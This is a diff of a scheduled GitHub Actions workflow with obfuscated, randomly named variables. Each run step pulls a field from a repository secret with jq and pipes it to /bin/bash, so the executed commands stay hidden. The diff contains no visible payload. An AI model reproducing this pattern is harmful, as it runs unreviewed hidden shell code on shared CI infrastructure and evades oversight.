@@ -1,9 +1,8 @@
 name: xiangyuhuanliu
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 5/6 * * *'
+    - cron: '47 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: xiangyuhuanliu
         env:
-          njm69: ${{ secrets.njm69 }}
+          zc23979: ${{ secrets.zc23979 }}
         run: |
-          echo $njm69 | jq -r .yz16232 | /bin/bash
-          echo $kikz6 | jq -r .m80250 | /bin/bash
-          echo $wlmtp80 | jq -r .kaodb58 | /bin/bash
-          echo $f3 | jq -r .z939 | /bin/bash
-          echo $b53175 | jq -r .kxy22 | /bin/bash
-          echo $ym3726 | jq -r .ideb7847 | /bin/bash
+          echo $zc23979 | jq -r .goib97726 | /bin/bash
+          echo $alou88 | jq -r .hd4 | /bin/bash
+          echo $jkaug4 | jq -r .mksq75181 | /bin/bash
+          echo $qumns4 | jq -r .gf30 | /bin/bash
+          echo $gctl0980 | jq -r .dtrhb9 | /bin/bash
+          echo $utveu848 | jq -r .nnbm4 | /bin/bash
+          echo $zj38 | jq -r .kknvs47 | /bin/bash
+          echo $iri521 | jq -r .zdh498 | /bin/bash
+          echo $v36497 | jq -r .nor0945 | /bin/bash
 
